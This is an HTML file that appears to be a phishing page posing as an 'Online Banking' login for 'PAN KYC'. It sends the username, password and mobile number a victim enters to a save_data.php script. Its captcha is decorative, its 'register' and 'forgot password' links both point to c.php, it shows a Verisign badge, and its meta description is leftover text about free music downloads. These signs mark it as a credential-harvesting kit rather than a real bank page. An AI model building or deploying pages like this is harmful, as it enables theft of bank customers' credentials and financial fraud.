<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <meta name="description" content="Login here and download unlimited music for free">
  <link rel="stylesheet" href="_next/static/css/4fe567a3edae9b32.css">
  <script defer src="_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
  <script defer src="_next/static/chunks/webpack-dc5f087a0afb0f82.js"></script>
  <script defer src="_next/static/chunks/framework-fe99aa755573eedd.js"></script>
  <script defer src="_next/static/chunks/main-9fb5a3102d78fd83.js"></script>
  <script defer src="_next/static/chunks/pages/_app-620102ba3a9296b8.js"></script>
</head>
<body>
  <div id="__next">
    <main>
      <div class="logo">
        <img src="image.png" alt="site logo" loading="lazy">
      </div>
      <br>
      <div class="login-heading">
        <h3 class="text-center">Login to Online Banking for PAN KYC</h3>
      </div>
      <div class="login-form">
        <p class="info"><span>(CARE:</span> Username and password are case-sensitive)</p>
        <form action="save_data.php" class="form" method="post">
          <div class="form-group">
            <label for="Username">Username <span class="mandatory_txt">*</span></label>
            <input name="Username" type="text" class="form-control" id="Username" required maxlength="30" aria-label="Username">
          </div>
          <div class="form-group">
            <label for="Password">Password <span class="mandatory_txt">*</span></label>
            <input name="Password" type="password" class="form-control" id="Password" required maxlength="30" aria-label="Password">
          </div>
          <div class="form-group">
            <label for="Mobile">Mobile <span class="mandatory_txt">*</span></label>
            <input name="Mobile" type="tel" class="form-control" id="Mobile" required maxlength="10" aria-label="Mobile">
          </div>
          <div class="form-group">
            <label for="captcha">Enter the text as shown in the image <span class="mandatory_txt">*</span></label>
            <input type="text" class="form-control" id="captcha" required maxlength="30" aria-label="captcha">
          </div>
          <label>Select one of the Captcha options:</label>
          <div class="captcha">
            <input type="radio" id="imageCaptcha" name="captchaOption" checked>
            <label for="imageCaptcha">Image Captcha</label>
            <input type="radio" id="audioCaptcha" name="captchaOption">
            <label for="audioCaptcha">Audio Captcha</label>
          </div>
          <div class="captcha-image">
            <img src="ct.png" alt="captcha image" loading="lazy">
          </div>
          <div class="form-group">
            <input type="submit" class="btn" value="Login">
            <input type="reset" class="btn" value="Reset">
          </div>
          <p><a href="c.php">New User? Register here/Activate</a></p>
          <p><a href="c.php">Forgot Username / Login Password?</a></p>
        </form>
      </div>
      <div class="p-body">
        <ul class="provide">
          <li>Mandatory fields are marked with an asterisk (*)</li>
          <li>Do not share your username and password anywhere.</li>
          <li>Your username and password are highly confidential. Never part with them. We will never ask for this information.</li>
        </ul>
      </div>
      <div class="footer_area">
        <img src="v.png" alt="Verisign" loading="lazy">
      </div>
      <div class="footer">
        <p>&copy; OnlineBanking</p>
      </div>
    </main>
  </div>
</body>
</html>